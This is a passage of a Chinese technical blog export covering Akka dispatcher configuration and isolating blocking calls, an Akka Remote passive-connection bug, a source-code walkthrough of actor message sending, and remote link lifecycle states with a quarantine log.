注释：线程池执行器调度程序由java.util.concurrent.ThreadPoolExecutor实现。你可以在 JDK 的「ThreadPoolExecutor 文档」中了解更多关于它的信息。 有关更多选项，请参阅「配置」的默认调度器部分。然后你就可以像往常一样创建 Actor，并在部署配置中定义调度器。 1ActorRef myActor = system.actorOf(Props.create(MyActor.class), &quot;myactor&quot;); 12345akka.actor.deployment &#123; /myactor &#123; dispatcher = my-dispatcher &#125;&#125; 部署配置的另一种选择是在代码中定义调度器。如果在部署配置中定义dispatcher，则将使用此值，而不是以编程方式提供的参数。 12ActorRef myActor = system.actorOf(Props.create(MyActor.class).withDispatcher(&quot;my-dispatcher&quot;), &quot;myactor3&quot;); 注释：在withDispatcher中指定的调度器和部署配置中的dispatcher属性实际上是进入配置的路径。所以在这个例子中，它是一个顶级部分，但是你可以把它作为一个子部分，在这里你可以用句点来表示子部分，就像这样：foo.bar.my-dispatcher 6.调度器类型有 3 种不同类型的消息调度器： Dispatcher:这是一个基于事件的调度程序,它将一组 Actor 绑定到线程池。如果未指定调度器,则使用默认调度器。 可共享性：Unlimited 邮箱：任意，为每个 Actor 创建一个 用例：默认调度器，Bulkheading 驱动：java.util.concurrent.ExecutorService。使用fork-join-executor、thread-pool-executor或akka.dispatcher.ExecutorServiceConfigurator的FQCN指定的executor。 PinnedDispatcher：这个调度器为每个使用它的 Actor 指定唯一的线程；即每个 Actor 将拥有自己的线程池，池中只有一个线程。 可共享性：None 邮箱：任意，为每个 Actor 创建一个 用例：Bulkheading 驱动：任何akka.dispatch.ThreadPoolExecutorConfigurator。默认情况下为thread-pool-executor。 CallingThreadDispatcher：此调度器仅在当前调用的线程上运行。这个调度器不创建任何新的线程，但是它可以从不同的线程并发地用于同一个 Actor。有关详细信息和限制，请参阅「CallingThreadDispatcher」。 可共享性：Unlimited 邮箱：任意，为每个 Actor 创建一个（按需） 用例：Testing 驱动：调用线程（duh）7.更多调度器配置示例配置具有固定线程池大小的调度器，例如，对于执行阻塞 IO 的 Actor：12345678blocking-io-dispatcher &#123; type = Dispatcher executor = &quot;thread-pool-executor&quot; thread-pool-executor &#123; fixed-pool-size = 32 &#125; throughput = 1&#125; 然后使用它：12ActorRef myActor = system.actorOf(Props.create(MyActor.class).withDispatcher(&quot;blocking-io-dispatcher&quot;)); 另一个基于核（cores）数量使用线程池的示例，例如，对于 CPU 绑定的任务：12345678910111213141516171819my-thread-pool-dispatcher &#123; # Dispatcher is the name of the event-based dispatcher type = Dispatcher # What kind of ExecutionService to use executor = &quot;thread-pool-executor&quot; # Configuration for the thread pool thread-pool-executor &#123; # minimum number of threads to cap factor-based core number to core-pool-size-min = 2 # No of core threads ... ceil(available processors * factor) core-pool-size-factor = 2.0 # maximum number of threads to cap factor-based number to core-pool-size-max = 10 &#125; # Throughput defines the maximum number of messages to be # processed per actor before the thread jumps to the next actor. # Set to 1 for as fair as possible. throughput = 100&#125; 在保持某些内部状态的 Actor 数量相对较少的情况下，使用关联池（affinity pool）的不同类型的调度器可能会增加吞吐量。关联池尽可能的确保 Actor 总是被安排在同一线程上运行。这个 Actor 到线程的连接（pinning）旨在增加 CPU 缓存命中率，这可能使吞吐量显著提高。12345678910111213141516171819affinity-pool-dispatcher &#123; # Dispatcher is the name of the event-based dispatcher type = Dispatcher # What kind of ExecutionService to use executor = &quot;affinity-pool-executor&quot; # Configuration for the thread pool affinity-pool-executor &#123; # Min number of threads to cap factor-based parallelism number to parallelism-min = 8 # Parallelism (threads) ... ceil(available processors * factor) parallelism-factor = 1 # Max number of threads to cap factor-based parallelism number to parallelism-max = 16 &#125; # Throughput defines the maximum number of messages to be # processed per actor before the thread jumps to the next actor. # Set to 1 for as fair as possible. throughput = 100&#125; 配置一个PinnedDispatcher：1234my-pinned-dispatcher &#123; executor = &quot;thread-pool-executor&quot; type = PinnedDispatcher&#125; 然后使用它：123ActorRef myActor = system.actorOf(Props.create(MyActor.class).withDispatcher(&quot;my-pinned-dispatcher&quot;)); 注意，根据上面的my-thread-pool-dispatcher示例，thread-pool-executor配置不适用（NOT applicable）。这是因为每个 Actor 在使用PinnedDispatcher时都有自己的线程池，而该池只有一个线程。注意，不能保证随着时间的推移使用相同的线程，因为核心池超时用于PinnedDispatcher，以在空闲 Actor 的情况下保持资源使用率低。要始终使用同一线程，需要添加PinnedDispatcher的配置thread-pool-executor.allow-core-timeout=off。​ 8.阻塞需要小心管理在某些情况下，不可避免地要执行阻塞操作，即让线程休眠一段不确定的时间，等待发生外部事件。例如，传统的 RDBMS 驱动程序或消息传递 API，其根本原因通常是（网络）I/O 发生在表面之下（occurs under the covers）。 1234567891011121314class BlockingActor extends AbstractActor &#123; @Override public Receive createReceive() &#123; return receiveBuilder() .match( Integer.class, i -&gt; &#123; Thread.sleep(5000); // block for 5 seconds, representing blocking I/O, etc System.out.println(&quot;Blocking operation finished: &quot; + i); &#125;) .build(); &#125;&#125; 面对这种情况，你可能会试图将阻塞调用包装在Future，并改为使用它，但这种策略过于简单：当应用程序在增加的负载下运行时，很可能会发现瓶颈或内存或线程不足。 12345678910111213141516171819202122class BlockingFutureActor extends AbstractActor &#123; ExecutionContext ec = getContext().getDispatcher(); @Override public Receive createReceive() &#123; return receiveBuilder() .match( Integer.class, i -&gt; &#123; System.out.println(&quot;Calling blocking Future: &quot; + i); Future&lt;Integer&gt; f = Futures.future( () -&gt; &#123; Thread.sleep(5000); System.out.println(&quot;Blocking future finished: &quot; + i); return i; &#125;, ec); &#125;) .build(); &#125;&#125; 8.1 问题：在默认调度器上阻塞在这里，关键的一行是： 1ExecutionContext ec = getContext().getDispatcher(); 使用getContext().getDispatcher()作为调度器，在该调度器上阻塞Future的执行可能是一个问题，因为默认情况下，除非为 Actor 设置单独的调度器，否则此调度器也将用于所有其他 Actor。如果所有可用的线程都被阻塞，那么同一调度器上的所有 Actor 都将因线程而发生饥饿，并且无法处理传入的消息。 注释：如果可能，还应避免阻塞 API。尝试寻找或构建Reactive API，以便将阻塞最小化，或者将其转移到专用的调度器。通常在与现有库或系统集成时，不可能避免阻塞 API，下面的解决方案解释了如何正确处理阻塞操作。请注意，同样的提示也适用于管理 Akka 中任何地方的阻塞操作，包括流、HTTP 和其他构建在其上的响应式库。 让我们用上面的BlockingFutureActor和下面的PrintActor设置一个应用程序。 123456789101112class PrintActor extends AbstractActor &#123; @Override public Receive createReceive() &#123; return receiveBuilder() .match( Integer.class, i -&gt; &#123; System.out.println(&quot;PrintActor: &quot; + i); &#125;) .build(); &#125;&#125; 1234567ActorRef actor1 = system.actorOf(Props.create(BlockingFutureActor.class));ActorRef actor2 = system.actorOf(Props.create(PrintActor.class));for (int i = 0; i &lt; 100; i++) &#123; actor1.tell(i, ActorRef.noSender()); actor2.tell(i, ActorRef.noSender());&#125; 在这里，应用程序向BlockingFutureActor和PrintActor发送 100 条消息，大量akka.actor.default-dispatcher线程正在处理请求。当你运行上述代码时，很可能会看到整个应用程序被卡在如下位置： 12&gt; PrintActor: 44&gt; PrintActor: 45 PrintActor被认为是非阻塞的，但是它不能继续处理剩余的消息，因为所有线程都被另一个阻塞 Actor 占用和阻塞，从而导致线程不足。在下面的螺纹状态图中，颜色具有以下含义： 天蓝色 - 休眠状态 橙色 - 等待状态 绿色 - 运行状态 线程信息是使用YourKit profiler记录的，但是任何好的 JVM profiler都有这个特性，包括免费的和与 Oracle JDK VisualVM 捆绑的，以及 Oracle Flight Recorder。线程的橙色部分表示它处于空闲状态。空闲线程很好，它们准备接受新的工作。然而，大量的天蓝色（阻塞，或者像我们的例子中那样休眠）线程是非常糟糕的，会导致线程饥饿。 注释：如果你订阅了 LightBend 的商业服务，你可以使用「线程饥饿检测器」，如果它检测到你的任何调度程序有饥饿和其他问题，它将发出警告日志语句。这是识别生产系统中发生的问题的有用步骤，然后你可以应用下面解释的建议解决方案。 在上面的示例中，我们通过向阻塞 Actor 发送数百条消息来加载代码，这会导致默认调度器的线程被阻塞。然后，Akka 中基于fork join池的调度器尝试通过向池中添加更多线程来补偿此阻塞（default-akka.actor.default-dispatcher 18,19,20,…）。但是，如果这些操作会立即被阻塞，并且最终阻塞操作将主宰整个调度器，那么这将无济于事。实质上，Thread.sleep操作控制了所有线程，并导致在默认调度器上执行的任何操作都需要资源，包括尚未为其配置显式调度器的任何 Actor。 8.2 解决方案：用于阻塞操作的专用调度器隔离阻塞行为以使其不影响系统其余部分的最有效方法之一是，为所有这些阻塞操作准备和使用专用调度器。这种技术通常被称为“bulk-heading”或简单的“isolating blocking”。在application.conf中，专门用于阻塞行为的调度器应配置如下： 12345678my-blocking-dispatcher &#123; type = Dispatcher executor = &quot;thread-pool-executor&quot; thread-pool-executor &#123; fixed-pool-size = 16 &#125; throughput = 1&#125; 基于thread-pool-executor的调度器允许我们对它将承载的线程数设置限制，这样我们就可以严格控制系统中最多有多少被阻塞的线程。具体的大小应该根据你期望在此调度器上运行的工作负载以及运行应用程序的计算机的核数量（number of cores）进行微调。通常，核数周围的小数字是一个很好的默认值。每当需要进行阻塞时，使用上面配置的调度器而不是默认调度程序：​ 12345678910111213141516171819202122class SeparateDispatcherFutureActor extends AbstractActor &#123; ExecutionContext ec = getContext().getSystem().dispatchers().lookup(&quot;my-blocking-dispatcher&quot;); @Override public Receive createReceive() &#123; return receiveBuilder() .match( Integer.class, i -&gt; &#123; System.out.println(&quot;Calling blocking Future on separate dispatcher: &quot; + i); Future&lt;Integer&gt; f = Futures.future( () -&gt; &#123; Thread.sleep(5000); System.out.println(&quot;Blocking future finished: &quot; + i); return i; &#125;, ec); &#125;) .build(); &#125;&#125; 线程池行为如下图所示：发送给SeparateDispatcherFutureActor和PrintActor的消息由默认调度器处理，绿线表示实际执行。在my-blocking-dispatcher上运行阻塞操作时，它使用线程（达到配置的限制）来处理这些操作。在这种情况下，休眠与这个调度器很好地隔离开来，默认的调度器不受影响，允许应用程序的其余部分继续运行，就好像没有发生什么不好的事情一样。经过一段时间的空闲之后，由这个调度程序启动的线程将被关闭。在这种情况下，其他 Actor 的吞吐量没有受到影响，它们仍然在默认调度器上工作。这是处理响应式应用程序中任何类型的阻塞的推荐方法。有关 Akka HTTP 的类似讨论，请参阅「Handling blocking operations in Akka HTTP」。 8.3. 阻止操作的可用解决方案针对“阻塞问题”的充分解决方案的非详尽清单包括以下建议： 在由路由器管理的 Actor（或一组 Actor）内执行阻塞调用，确保配置专门用于此目的或足够大的线程池。 在Future上执行阻塞调用，确保在任何时间点对此类调用的数量上限，提交无限数量的此类任务将耗尽内存或线程限制。 在Future执行阻塞调用，为线程池提供一个线程数上限，该上限适用于运行应用程序的硬件，如本节中详细介绍的那样。 指定一个线程来管理一组阻塞资源（例如，驱动多个通道的 NIO 选择器），并在事件作为 Actor 消息发生时分派它们。 第一种可能性特别适用于本质上是单线程的资源，例如数据库句柄，传统上一次只能执行一个未完成的查询，并使用内部同步来确保这一点。一种常见的模式是为N个 Actor 创建一个路由器，每个 Actor 包装一个 DB 连接，并处理发送到路由器的查询。然后，必须根据最大吞吐量调整数量N，这将根据部署在哪个硬件上的 DBMS 而有所不同。 注释：配置线程池是一项最适合授权给 Akka 的任务，在application.conf中对其进行配置，并通过ActorSystem进行实例化。 ​ 参考https://cloud.tencent.com/developer/article/1435517","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Remote-问题汇总","slug":"network/akka/Akka-Remote-问题汇总","date":"2021-12-03T07:49:51.660Z","updated":"2021-12-03T09:09:32.955Z","comments":true,"path":"2021/12/03/network/akka/Akka-Remote-问题汇总/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/","excerpt":"","text":"1.use-passive-connections bugbug：https://github.com/akka/akka/issues/24393​ 123put(&quot;akka.remote.use-passive-connections&quot;, &quot;on&quot;);//这个改为100主要是为了提高问题复现概率put(&quot;akka.remote.retry-gate-closed-for&quot;, 100); \u0000在双向链路通道时，由于采用连接复用会造成一端发送另外一端收不到 1put(&quot;akka.remote.use-passive-connections&quot;, &quot;off&quot;); 相关错误日志 1230930 10:22:14,996:DeadLetter:13 message: Disassociated [akka.tcp://msg@10.3.1.241:1235] -&gt; [akka.tcp://cmp@10.3.1.241:1238]0930 10:22:15,181:DeadLetter:13 message: Associated [akka.tcp://msg@10.3.1.241:1235] &lt;- [akka.tcp://cmp@10.3.1.241:1238]0930 10:22:15,182:DeadLetter:13 message: Disassociated [akka.tcp://msg@10.3.1.241:1235] -&gt; [akka.tcp://cmp@10.3.1.241:1238]","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Actor-Actor发消息","slug":"network/akka/Akka-Actor-Actor发消息","date":"2021-12-03T07:49:33.192Z","updated":"2021-12-03T09:07:15.120Z","comments":true,"path":"2021/12/03/network/akka/Akka-Actor-Actor发消息/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Actor-Actor%E5%8F%91%E6%B6%88%E6%81%AF/","excerpt":"","text":"1.概述1.1 示例 前面两简单介绍了ActorSystem、actor以及dispatcher和mailbox的创建，下面我们就来看一下actor发消息的内部机制。 123val system = ActorSystem(&quot;firstActorSystem&quot;,ConfigFactory.load())val helloActor = system.actorOf(Props(new HelloActor),&quot;HelloActor&quot;)helloActor ! &quot;Hello&quot; 同样还是回到一个简单的akka应用，通过之前的分析我们知道，helloActor应该是一个RepointableActorRef类型的对象，那么调用 ！ 应该也是调用RepointableActorRef对应的 ！ 方法。 1def !(message: Any)(implicit sender: ActorRef = Actor.noSender) = underlying.sendMessage(message, sender) 1.2 解析 上面是RepointableActorRef对！方法的实现，其实就是调用underlying.sendMessage。怎么样，underliying是不是似曾相似呢？再来看看underliying的定义，它是一个Cell类，不过获取过程稍显复杂啊。 12345678910111213141516171819202122232425/* * H E R E B E D R A G O N S ! * * There are two main functions of a Cell: message queueing and child lookup. * When switching out the UnstartedCell for its real replacement, the former * must be switched after all messages have been drained from the temporary * queue into the real mailbox, while the latter must be switched before * processing the very first message (i.e. before Cell.start()). Hence there * are two refs here, one for each function, and they are switched just so. */ @volatile private var _cellDoNotCallMeDirectly: Cell = _ @volatile private var _lookupDoNotCallMeDirectly: Cell = _ def underlying: Cell = Unsafe.instance.getObjectVolatile(this, cellOffset).asInstanceOf[Cell] def lookup = Unsafe.instance.getObjectVolatile(this, lookupOffset).asInstanceOf[Cell] @tailrec final def swapCell(next: Cell): Cell = &#123; val old = underlying if (Unsafe.instance.compareAndSwapObject(this, cellOffset, old, next)) old else swapCell(next) &#125; @tailrec final def swapLookup(next: Cell): Cell = &#123; val old = lookup if (Unsafe.instance.compareAndSwapObject(this, lookupOffset, old, next)) old else swapLookup(next) &#125; 从官网源码的注释来看，这两个cell的功能进行了严格区分。一个用来消息的出队、入队，一个用来查找child。不过从initialize的逻辑来看，刚开始underlying是一个UnstartedCell实例。 12345678910111213141516def sendMessage(msg: Envelope): Unit = &#123; if (lock.tryLock(timeout.length, timeout.unit)) &#123; try &#123; val cell = self.underlying if (cellIsReady(cell)) &#123; cell.sendMessage(msg) &#125; else if (!queue.offer(msg)) &#123; system.eventStream.publish(Warning(self.path.toString, getClass, &quot;dropping message of type &quot; + msg.message.getClass + &quot; due to enqueue failure&quot;)) system.deadLetters.tell(DeadLetter(msg.message, msg.sender, self), msg.sender) &#125; else if (Mailbox.debug) println(s&quot;$self temp queueing $&#123;msg.message&#125; from $&#123;msg.sender&#125;&quot;) &#125; finally lock.unlock() &#125; else &#123; system.eventStream.publish(Warning(self.path.toString, getClass, &quot;dropping message of type&quot; + msg.message.getClass + &quot; due to lock timeout&quot;)) system.deadLetters.tell(DeadLetter(msg.message, msg.sender, self), msg.sender) &#125; &#125; 上面是UnstartedCell的sendMessage的具体实现。从代码来看如果underlying已经ready的话，就调用相应的sendMessage方法否则就把消息暂存到JLinkedList里面，其实就是java的LinkedList；如果暂存失败，则把消息发送到eventStream，并转发给deadLetters。那么underlying怎么判断是ready呢？ 1private[this] final def cellIsReady(cell: Cell): Boolean = (cell ne this) &amp;&amp; (cell ne null) 这判断方法也挺简单，就是判断RepointableActorRef的underlying和当前的cell指针是不是相同。还记得underlying是怎么初始化的吗？没错，就是一个UnstartedCell。那么underlying什么时候被修改了呢，或者说什么时候ready了呢？这个就要研究RepointableActorRef中用到underlying字段的地方了。 123456789101112131415161718192021222324def point(catchFailures: Boolean): this.type = underlying match &#123; case u: UnstartedCell ⇒ val cell = try newCell(u) catch &#123; case NonFatal(ex) if catchFailures ⇒ val safeDispatcher = system.dispatchers.defaultGlobalDispatcher new ActorCell(system, this, props, safeDispatcher, supervisor).initWithFailure(ex) &#125; /* * The problem here was that if the real actor (which will start running * at cell.start()) creates children in its constructor, then this may * happen before the swapCell in u.replaceWith, meaning that those * children cannot be looked up immediately, e.g. if they shall become * routees. */ swapLookup(cell) cell.start() u.replaceWith(cell) this case null ⇒ throw new IllegalStateException(&quot;underlying cell is null&quot;) case _ ⇒ this // this happens routinely for things which were created async=false &#125; 还记得initialize最后调用了point么，我们来看看这个函数是干啥的？看到没，它在判断underlying的类型，如果是UnstartedCell做了什么呢？简单来说就是它创建了一个新的ActorCell，然后调用新ActorCell的start函数，最后调用UnstartedCell的replaceWith函数。那么replaceWith做了什么呢？ 123456789101112131415161718192021222324252627def replaceWith(cell: Cell): Unit = locked &#123; try &#123; def drainSysmsgQueue(): Unit = &#123; // using while in case a sys msg enqueues another sys msg while (sysmsgQueue.nonEmpty) &#123; var sysQ = sysmsgQueue.reverse sysmsgQueue = SystemMessageList.LNil while (sysQ.nonEmpty) &#123; val msg = sysQ.head sysQ = sysQ.tail msg.unlink() cell.sendSystemMessage(msg) &#125; &#125; &#125; drainSysmsgQueue() while (!queue.isEmpty) &#123; cell.sendMessage(queue.poll()) // drain sysmsgQueue in case a msg enqueues a sys msg drainSysmsgQueue() &#125; &#125; finally &#123; self.swapCell(cell) &#125;&#125; 代码也比较简单，就是先把系统消息取出发送给新的Cell，然后把原来暂存的消息通过sendMessage转发给新Cell。最后调用了原来的swapCell函数，用刚才新创建的ActorCell替换underlying。 123456/** * This is called by activate() to obtain the cell which is to replace the * unstarted cell. The cell must be fully functional. */ def newCell(old: UnstartedCell): Cell = new ActorCell(system, this, props, dispatcher, supervisor).init(sendSupervise = false, mailboxType) 我们来看看新ActorCell的创建代码，也比较简单，就是new了一个ActorCell，然后调用init进行初始化。其实分析到这里，基本也就清楚了，helloActor ! &quot;Hello&quot;最终调用了ActorCell的sendMessage方法。不过在ActorCell里面并没有直接找到sendMessage的方法，这是为啥呢？是不是我们分析错了呢。在分析一下newCell方法我们会发现，它并没有直接返回ActorCell，而是返回了ActorCell调用你init之后的对象，我们似乎没有分析init，那就继续看吧。 通过追踪代码我们发现，init这是ActorCell从Dispatch继承的方法。 123456789101112131415161718192021222324252627282930313233343536373839404142434445/** * Initialize this cell, i.e. set up mailboxes and supervision. The UID must be * reasonably different from the previous UID of a possible actor with the same path, * which can be achieved by using ThreadLocalRandom.current.nextInt(). */ final def init(sendSupervise: Boolean, mailboxType: MailboxType): this.type = &#123; /* * Create the mailbox and enqueue the Create() message to ensure that * this is processed before anything else. */ val mbox = dispatcher.createMailbox(this, mailboxType) /* * The mailboxType was calculated taking into account what the MailboxType * has promised to produce. If that was more than the default, then we need * to reverify here because the dispatcher may well have screwed it up. */ // we need to delay the failure to the point of actor creation so we can handle // it properly in the normal way val actorClass = props.actorClass val createMessage = mailboxType match &#123; case _: ProducesMessageQueue[_] if system.mailboxes.hasRequiredType(actorClass) ⇒ val req = system.mailboxes.getRequiredType(actorClass) if (req isInstance mbox.messageQueue) Create(None) else &#123; val gotType = if (mbox.messageQueue == null) &quot;null&quot; else mbox.messageQueue.getClass.getName Create(Some(ActorInitializationException( self, s&quot;Actor [$self] requires mailbox type [$req] got [$gotType]&quot;))) &#125; case _ ⇒ Create(None) &#125; swapMailbox(mbox) mailbox.setActor(this) // ➡➡➡ NEVER SEND THE SAME SYSTEM MESSAGE OBJECT TO TWO ACTORS ⬅⬅⬅ mailbox.systemEnqueue(self, createMessage) if (sendSupervise) &#123; // ➡➡➡ NEVER SEND THE SAME SYSTEM MESSAGE OBJECT TO TWO ACTORS ⬅⬅⬅ parent.sendSystemMessage(akka.dispatch.sysmsg.Supervise(self, async = false)) &#125; this &#125; 首先用dispatcher创建了mailbox，那么dispatcher从哪里来的呢？从Dispatch的定义我们看出，继承Dispatch的一定子类必定是一个ActorCell，那么很明显，这个Dispatch就是子类ActorCell的的dispatcher字段。 1private[akka] trait Dispatch &#123; this: ActorCell ⇒ 从前面的分析我们知道dispatcher是akka.dispatch.Dispatcher的一个实例，下面是createMailbox函数的具体实现。 123456/** * INTERNAL API */protected[akka] def createMailbox(actor: akka.actor.Cell, mailboxType: MailboxType): Mailbox = &#123; new Mailbox(mailboxType.create(Some(actor.self), Some(actor.system))) with DefaultSystemMessageQueue&#125; 下面是Mailbox的定义，它继承了ForkJoinTask[Unit] 、SystemMessageQueue、Runnable，这好像可以放到线程池去执行的，不过我们先略过不作分析。 12345678/** * Mailbox and InternalMailbox is separated in two classes because ActorCell is needed for implementation, * but can&#x27;t be exposed to user defined mailbox subclasses. * * INTERNAL API */private[akka] abstract class Mailbox(val messageQueue: MessageQueue) extends ForkJoinTask[Unit] with SystemMessageQueue with Runnable 继续分析init我们发现，它通过swapMailbox方法把新创建的mbox赋值给了mailbox，然后又通过setActor把ActorCell与mailbox进行关联，最后给mailBox发送了一个createMessage。这也不再深入分析，继续回到Dispatch特质。我们发现ActorCell虽然没有实现sendMessage，但它继承的Dispatch实现了这个方法。 12345678def sendMessage(msg: Envelope): Unit = try &#123; val msgToDispatch = if (system.settings.SerializeAllMessages) serializeAndDeserialize(msg) else msg dispatcher.dispatch(this, msgToDispatch) &#125; catch handleException 很明显，最终调用了dispatcher的dispatch方法，把消息发送出去了。 12345678/** * INTERNAL API */ protected[akka] def dispatch(receiver: ActorCell, invocation: Envelope): Unit = &#123; val mbox = receiver.mailbox mbox.enqueue(receiver.self, invocation) registerForExecution(mbox, true, false) &#125; 上面是dispatch的方法，它调用receiver.mailbox的enqueue方法，把消息入队列，然后调用registerForExecution。 1234567891011121314151617181920212223242526/** * Returns if it was registered * * INTERNAL API */protected[akka] override def registerForExecution(mbox: Mailbox, hasMessageHint: Boolean, hasSystemMessageHint: Boolean): Boolean = &#123; if (mbox.canBeScheduledForExecution(hasMessageHint, hasSystemMessageHint)) &#123; //This needs to be here to ensure thread safety and no races if (mbox.setAsScheduled()) &#123; try &#123; executorService execute mbox true &#125; catch &#123; case e: RejectedExecutionException ⇒ try &#123; executorService execute mbox true &#125; catch &#123; //Retry once case e: RejectedExecutionException ⇒ mbox.setAsIdle() eventStream.publish(Error(e, getClass.getName, getClass, &quot;registerForExecution was rejected twice!&quot;)) throw e &#125; &#125; &#125; else false &#125; else false&#125; registerForExecution做了什么呢？很明显它修改了Mailbox的状态使其变成_Scheduled_ 。如果设置成功，则把该Mailbox放到executorService去调度。还记不记得Mailbox都实现了哪些接口呢：ForkJoinTask[Unit] 、SystemMessageQueue、Runnable。它当然是可以被线程池调度的啊。至此消息的发送就已经分析完毕了，通过上面的分析我们知道，发送消息的过程大概就是先把消息通过Mailbox的enque进入队列，当然这默认实现就是akka.dispatch.UnboundedMailbox。Mailbox会在ForkJoinPool（默认是这样的）线程池中申请一个线程进行调度，执行最终的run方法。​ 1234567891011override final def run(): Unit = &#123; try &#123; if (!isClosed) &#123; //Volatile read, needed here processAllSystemMessages() //First, deal with any system messages processMailbox() //Then deal with messages &#125; &#125; finally &#123; setAsIdle() //Volatile write, needed here dispatcher.registerForExecution(this, false, false) &#125; &#125; 下面是run方法的具体实现，也比较简单，就是调用processAllSystemMessages/processMailbox分别处理系统消息和用户发送的消息，当然不会全部把消息处理完毕，会有一定的限制（dispatch的吞吐量参数）。最后设置mailbox状态为idle，然后又调用了dispatcher.registerForExecution，进入下一次线程调度。mailbox这样以循环的方式对队列中的消息进行处理。由于时间关系，今天就先分析到这里。我们已经知道了 ！ 的内部细节，它只是把消息放到了mailbox的队列中，然后mailbox被线程池异步调度，循环处理队列中的数据。当然考虑到多线程，这个队列是一个一致性队列，线程安全。下一篇博文，我们会详细介绍processMailbox的功能，下面只是简单的贴出这个函数的源码，读者也可以先简单分析一下。 123456789101112131415161718/** * Process the messages in the mailbox */ @tailrec private final def processMailbox( left: Int = java.lang.Math.max(dispatcher.throughput, 1), deadlineNs: Long = if (dispatcher.isThroughputDeadlineTimeDefined == true) System.nanoTime + dispatcher.throughputDeadlineTime.toNanos else 0L): Unit = if (shouldProcessMessage) &#123; val next = dequeue() if (next ne null) &#123; if (Mailbox.debug) println(actor.self + &quot; processing message &quot; + next) actor invoke next if (Thread.interrupted()) throw new InterruptedException(&quot;Interrupted while processing actor messages&quot;) processAllSystemMessages() if ((left &gt; 1) &amp;&amp; ((dispatcher.isThroughputDeadlineTimeDefined == false) || (System.nanoTime - deadlineNs) &lt; 0)) processMailbox(left - 1, deadlineNs) &#125; &#125;","categories":[{"name":"network","slug":"network","permalink":"https://wuhaocn.github.io/categories/network/"}],"tags":[{"name":"akka","slug":"akka","permalink":"https://wuhaocn.github.io/tags/akka/"}]},{"title":"Akka-Remote-生命周期","slug":"network/akka/Akka-Remote-生命周期","date":"2021-12-03T07:49:25.004Z","updated":"2021-12-03T08:42:23.499Z","comments":true,"path":"2021/12/03/network/akka/Akka-Remote-生命周期/","link":"","permalink":"https://wuhaocn.github.io/2021/12/03/network/akka/Akka-Remote-%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F/","excerpt":"","text":"1.概述 Remote模式下，网络链接的生命周期往往影响着对应Actor的生命周期，那么网络链接的生命周期是怎么样的呢，详细可参考下图。 2.状态介绍 每一个与远程系统的链路都是四个状态之一：**空闲、活跃、被守护、被隔离。** 空闲（Idle） 远程系统的某个地址没有任何通信之前其关联状态就是Idle（空闲）。 活跃（Active） 当第一条消息试图发送给远程系统或入站链接被接受，链路的状态就被转化为Active（活跃），这也意味着两个系统有消息的接收或者发送，而且目前为止也没有发生任何失败。 被守护（Gated） 当一个通信失败，或者两个系统间的链接丢失，链路的状态就会变成Gated（被守护）。在被守护状态，系统不会试图去链接远程系统主机，所有出站消息都会被丢弃。链路处于Gated状态的时间是通过 akka.remote.retry-gate-closed-for 参数控制的，当超过这个时间，链路状态会重新转化成Idle（空闲）。Gate 是单边的，这也就意味着这期间无论何时当远程系统的入站链接被接受，都会被自动转化成Active（活跃）状态，通信被立即重用。 被隔离（Quarantined） 当通信失败，且无法恢复时，由于参与系统的状态不一致，远程系统就会变成Quarantined（被隔离）状态。与Gate不同，被隔离是永久的，它会一直持续到其中一个系统被重启。重启之后，通信可以被重新恢复，链路状态重新变成Active（活跃）。 3.状态流转其实remote的链路状态也比较容易理解，当没有建立连接时，就处于空闲状态；有入站链接请求或消息发送时，如果连接建立成功，则变成活跃状态；活跃状态时，如果发生通信失败且不是致命错误，比如网络中断，就会转到被守护状态；被守护状态下，在指定时间内，如果网络正常，且收到了成功的入站链接请求，则重新恢复到活跃状态，若超过指定守护时间则转化到空闲状态；在活跃状态下，如果发生灾难性、不可恢复的错误，比如系统消息传递失败或收到MemberRemoved事件，则该链路被隔离，直到远程系统重启后，收到成功的入站或出站链接，则重新转换到活跃状态。被守护、被隔离都是应对网络故障的，但分别对应可恢复和不可恢复。被守护期间还有一定的时间阈值，该阈值内还有机会编程活跃状态。 4.实例4.1 Akka Cluster节点Quarantined问题之前开发了一套基于akka cluster的调度|负载均衡系统，运行了半年均较稳定，但最近有节点两次down掉。由于没有太多经验，第一次down掉时经验主义地以为是内存吃紧导致程序异常（由于计算资源紧张，很多服务混布，内存确实非常紧张，时常有类似故障），第二次仔细检查了日志发现如下日志： 1[WARN] [03/17/2018 21:51:38.769] [cluster-akka.remote.default-remote-dispatcher-91] [akka.remote.Remoting] Tried to associate with unreachable remote address [akka.tcp://cluster@10.104.3.35:7712]. Address is now gated for 5000 ms, all messages to this address will be delivered to dead letters. Reason: [The remote system has quarantined this system. No further associations to the remote system are possible until this system is restarted.] 同时在其它正常的节点上有如下日志 12 [INFO] [03/13/2018 21:36:12.659] [cluster-akka.remote.default-remote-dispatcher-35339] [akka.remote.Remoting] Quarantined address [akka.tcp://cluster@10.104.3.36:7712] is still unreachable or has not been restarted. Keeping it quarantined. 同时master上还有记录 1234567891011121314151617ERROR] [03/17/2018 21:51:37.662] [cluster-akka.remote.default-remote-dispatcher-127527] [akka.remote.Remoting] Association to [akka.tcp://cluster@10.104.3.36:7712] with UID [1258718596] irrecoverably failed. Quarantining address.java.util.concurrent.TimeoutException: Remote system has been silent for too long. (more than 48.0 hours) at akka.remote.ReliableDeliverySupervisor$$anonfun$idle$1.applyOrElse(Endpoint.scala:383) at akka.actor.Actor.aroundReceive(Actor.scala:517) at akka.actor.Actor.aroundReceive$(Actor.scala:515) at akka.remote.ReliableDeliverySupervisor.aroundReceive(Endpoint.scala:203) at akka.actor.ActorCell.receiveMessage(ActorCell.scala:527) at akka.actor.ActorCell.invoke(ActorCell.scala:496) at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257) at akka.dispatch.Mailbox.run(Mailbox.scala:224) at akka.dispatch.Mailbox.exec(Mailbox.scala:234) at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) at 